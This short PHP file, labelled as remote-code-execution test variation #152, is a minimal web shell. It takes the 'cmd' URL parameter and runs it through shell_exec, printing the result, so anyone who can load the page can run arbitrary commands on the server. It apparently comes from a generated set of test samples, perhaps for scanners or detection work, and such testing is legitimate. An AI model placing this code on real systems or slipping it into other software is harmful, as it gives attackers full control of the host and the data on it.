<?php
// RCE test variation #152
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>